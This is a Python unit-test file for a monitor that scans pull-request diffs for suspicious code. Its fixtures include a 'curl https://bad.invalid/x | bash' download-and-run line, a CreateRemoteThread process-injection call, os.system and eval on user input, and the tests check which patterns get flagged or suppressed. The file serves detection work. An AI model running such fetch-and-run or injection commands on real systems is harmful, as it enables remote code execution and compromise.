import unittest
import monitor

class MonitorTests(unittest.TestCase):
    def test_os_command(self):
        self.assertTrue(monitor.scan("diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1 @@\n+os.system('whoami')"))
    def test_process_injection_high(self):
        findings = monitor.scan("diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1 @@\n+CreateRemoteThread(handle)")
        self.assertTrue(any(x["severity"] == "high" for x in findings))
    def test_weak_test_context_suppressed(self):
        self.assertEqual(monitor.scan("diff --git a/tests/test_a.py b/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -0,0 +1 @@\n+subprocess.run(cmd, shell=True)"), [])
    def test_high_signal_not_suppressed_in_test_file(self):
        findings = monitor.scan("diff --git a/tests/test_a.py b/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -0,0 +1 @@\n+curl https://bad.invalid/x | bash")
        self.assertTrue(any(x["severity"] == "high" for x in findings))
    def test_duplicate_pr(self):
        p = {"number": 1, "title": "Add startup security check", "author": {"login": "a"}}
        q = {"number": 2, "title": "Add startup security check", "author": {"login": "b"}}
        self.assertTrue(monitor.duplicate_checks([p, q])[1])
    def test_previous_malicious_signature_is_flagged(self):
        first = {"severity": "high", "pattern": "Process injection", "match": "CreateRemoteThread(handle)", "file": "src/a.cpp", "line": 10}
        state = {}
        monitor.learn_from_previous([first], state, 100)
        second = {"severity": "high", "pattern": "Process injection", "match": "CreateRemoteThread(handle)", "file": "src/b.cpp", "line": 20}
        findings = monitor.learn_from_previous([second], state, 101)
        self.assertTrue(any(x["pattern"] == "Previously detected malicious-code signature" and x["related_pr"] == 100 for x in findings))


    def test_load_state_repairs_literal_newline_suffix(self):
        import json
        import tempfile
        from pathlib import Path

        original = {"reviewed": {"123:abc": {"verdict": "scan-only"}}, "pending": [{"pr": 124, "head_sha": "def"}]}
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "monitor_state.json"
            path.write_text(json.dumps(original) + r"\n", encoding="utf-8")
            loaded = monitor.load_state(path)
            self.assertEqual(loaded, original)
            self.assertEqual(json.loads(path.read_text(encoding="utf-8")), original)

    def test_regex_compile_is_not_dynamic_execution(self):
        findings = monitor.scan("diff --git a/tools/a.py b/tools/a.py\n+++ b/tools/a.py\n@@ -0,0 +1 @@\n+pattern = re.compile(r'\\\\d+')")
        self.assertFalse(any(x["pattern"] == "Dynamic code execution" for x in findings))

    def test_builtin_eval_remains_detected(self):
        findings = monitor.scan("diff --git a/tools/a.py b/tools/a.py\n+++ b/tools/a.py\n@@ -0,0 +1 @@\n+result = eval(user_input)")
        self.assertTrue(any(x["pattern"] == "Dynamic code execution" for x in findings))

    def test_todo_variable_is_not_a_security_finding(self):
        diff = "diff --git a/make_game.py b/make_game.py\n+++ b/make_game.py\n@@ -0,0 +1,4 @@\n+todo = []\n+todo.append(entry)\n+if not todo:\n+    write_index(todo)"
        findings = monitor.scan(diff)
        self.assertFalse(any(x["pattern"] == "Unfinished-work marker" for x in findings))

if __name__ == "__main__":
    unittest.main()
